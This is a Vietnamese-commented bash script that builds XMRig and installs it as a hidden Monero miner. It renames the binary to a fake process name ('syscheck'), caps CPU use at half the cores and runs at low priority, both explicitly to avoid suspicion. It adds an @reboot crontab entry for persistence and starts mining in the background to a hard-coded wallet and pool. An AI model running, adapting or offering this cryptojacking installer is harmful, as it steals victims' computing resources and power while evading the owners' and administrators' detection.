#!/bin/bash

# ======= Cấu hình =======
WALLET="47xooGnFD6CLUExhWnGEhaLZwpfsAXRw47pqQcFNVc19FewwwvdEdB65CuL8DNXu5pXbsYfVxvQxg6UN6DgPnhaKS87pkEA"
WORKER="silent_$(hostname)"
POOL="pool.supportxmr.com:3333"
CPU_THREADS=$(($(nproc) / 2)) # Dùng 50% số core để tránh bị nghi ngờ
PRIORITY=1                    # Ưu tiên thấp
CUSTOM_NAME="syscheck"       # Tên process giả mạo
# ========================

echo "🔧 Cài XMRig (ẩn mình) vào ~/xmrig..."

# Cài thư viện cần thiết
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# Clone mã nguồn
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig

# Build XMRig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$(nproc)

# Đổi tên binary để tránh bị soi
cd ~
mkdir -p xmrig/silent
cp ~/xmrig/build/xmrig ~/xmrig/silent/$CUSTOM_NAME
chmod +x ~/xmrig/silent/$CUSTOM_NAME

# Tạo file khởi động
cat > ~/xmrig/silent/start.sh << EOF
#!/bin/bash
cd ~/xmrig/silent
./$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0
EOF

chmod +x ~/xmrig/silent/start.sh

# Tạo cronjob chạy ngầm khi reboot (tùy chọn)
(crontab -l 2>/dev/null; echo "@reboot bash ~/xmrig/silent/start.sh > /dev/null 2>&1") | crontab -

echo ""
echo "✅ Đã cài đặt XMRig (ẩn danh)"
echo "👷 Worker: $WORKER"
echo "🔧 Đổi tên process thành: $CUSTOM_NAME"
echo "🧠 Dùng $CPU_THREADS luồng CPU (trong tổng $(nproc))"
echo "📍 Pool: $POOL"
echo ""
echo "🚀 Bắt đầu đào trong nền..."
sleep 2
nohup ~/xmrig/silent/start.sh > /dev/null 2>&1 &
